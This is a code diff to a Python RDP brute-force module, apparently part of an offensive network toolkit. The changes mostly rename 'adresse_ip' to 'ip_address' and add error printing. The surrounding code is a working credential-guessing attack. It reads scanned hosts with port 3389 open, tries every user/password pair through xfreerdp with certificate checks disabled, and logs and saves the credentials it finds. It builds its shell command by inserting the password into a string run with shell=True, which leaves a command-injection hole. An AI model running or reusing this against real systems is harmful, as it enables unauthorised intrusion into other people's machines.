@@ -25,7 +25,7 @@ b_port = 3389
 b_parent = None
 # TODO
 """
-adresse_ip = None # define default after known
+ip_address = None # define default after known
 user = None # define default after known
 password = None # define default after known
 mac_address = None # define default after known
@@ -98,23 +98,24 @@ class RDPConnector:
             self.scan["Ports"] = None
         self.scan = self.scan[self.scan["Ports"].str.contains("3389", na=False)]
 
-    def rdp_connect(self, adresse_ip, user, password):
+    def rdp_connect(self, ip_address, user, password):
         """
         Attempt to connect to an RDP service using the given credentials.
         """
         command = (
-            f"xfreerdp /v:{adresse_ip} /u:{user} /p:{password} /cert:ignore +auth-only"
+            f"xfreerdp /v:{ip_address} /u:{user} /p:{password} /cert:ignore +auth-only"
         )
         try:
             process = subprocess.Popen(
                 command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
             )
-            stdout, stderr = process.communicate()
+            _, _ = process.communicate()
             if process.returncode == 0:
                 return True
             else:
                 return False
         except subprocess.SubprocessError as e:
+            print(e)
             return False
 
     def worker(self, progress, task_id, success_flag):
@@ -128,14 +129,14 @@ class RDPConnector:
                 )
                 break
 
-            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
-            if self.rdp_connect(adresse_ip, user, password):
+            ip_address, user, password, mac_address, hostname, port = self.queue.get()
+            if self.rdp_connect(ip_address, user, password):
                 with self.lock:
                     self.results.append(
-                        [mac_address, adresse_ip, hostname, user, password, port]
+                        [mac_address, ip_address, hostname, user, password, port]
                     )
                     logger.success(
-                        f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}"
+                        f"Found credentials for IP: {ip_address} | User: {user} | Password: {password}"
                     )
                     self.save_results()
                     self.removeduplicates()
@@ -143,7 +144,7 @@ class RDPConnector:
             self.queue.task_done()
             progress.update(task_id, advance=1)
 
-    def run_bruteforce(self, adresse_ip, port):
+    def run_bruteforce(self, ip_address, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
 
         total_tasks = len(self.users) * len(self.passwords)
@@ -156,7 +157,7 @@ class RDPConnector:
                     )
                     return False, []
                 self.queue.put(
-                    (adresse_ip, user, password, mac_address, hostname, port)
+                    (ip_address, user, password, mac_address, hostname, port)
                 )
 
         success_flag = [False]
@@ -171,10 +172,10 @@ class RDPConnector:
             task_id = progress.add_task("[cyan]Bruteforcing RDP...", total=total_tasks)
 
             mac_address = self.scan.loc[
-                self.scan["IPs"] == adresse_ip, "MAC Address"
+                self.scan["IPs"] == ip_address, "MAC Address"
             ].values[0]
             hostname = self.scan.loc[
-                self.scan["IPs"] == adresse_ip, "Hostnames"
+                self.scan["IPs"] == ip_address, "Hostnames"
             ].values[0]
 
             for _ in range(
